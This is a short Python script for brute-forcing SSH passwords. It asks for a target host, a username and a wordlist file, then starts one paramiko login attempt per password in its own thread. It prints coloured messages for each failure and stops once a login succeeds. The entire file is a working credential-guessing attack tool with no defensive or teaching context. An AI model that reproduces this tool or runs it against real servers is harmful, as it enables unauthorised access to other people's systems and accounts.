import socket,os,sys,paramiko
import threading,time

flag = 0
count = 0

def ssh_connect(password):

    global flag,count
    count = count + 1
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username = username, password = password)
        flag = 1
        print("\033[36;1m" + "[+] Password found in " + str(count) + "th " + "attempt.")
        print("\033[36;1m" + "[+] Username: " + username + "\t" + "Password: " + password)
    except:
        print("\033[31;1m" + "[-] Username: " + username + "\t" + "Password: " + password)
    
    ssh.close()


print('\n')

host = input("\033[32;1m" + '[*] Enter Target: ')                  # input target
username = input("\033[32;1m" + '[*] SSH Username: ')              # SSH username
passFile = input("\033[32;1m" + '[*] Enter Password File: ')       # input password file 
print('\n')
print("\033[33;1m" + "Finding Password for User: " + username) 


if os.path.exists(passFile) == False:
    print("\033[37;1m" + '[!] File not Found!')
    sys.exit(1)


with open(passFile, 'r') as file:
    for line in file.readlines():
        if (flag == 1):
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect,args=(password,))
        t.start()
        time.sleep(0.5)
